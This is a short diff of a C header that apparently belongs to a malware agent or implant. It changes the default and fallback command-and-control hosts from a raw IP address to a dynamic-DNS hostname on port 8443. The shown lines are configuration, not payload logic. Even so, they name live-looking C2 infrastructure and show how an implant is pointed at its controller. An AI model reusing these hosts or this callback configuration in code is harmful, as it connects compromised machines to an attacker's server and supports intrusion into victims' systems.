@@ -21,8 +21,8 @@ extern volatile bool ph_agent_is_busy;
 #define PH_FINGERPRINT_SIZE 16
 
 #define DEFAULT_C2_PORT 8443
-#define DEFAULT_C2_HOST "116.202.105.253"
-#define FALLBACK_C2_HOST "116.202.105.253"
+#define DEFAULT_C2_HOST "oyen-sce.serveblog.net"
+#define FALLBACK_C2_HOST "oyen-sce.serveblog.net"
 
 #define PH_OK 0
 #define PH_ERR_NULL_PTR -1
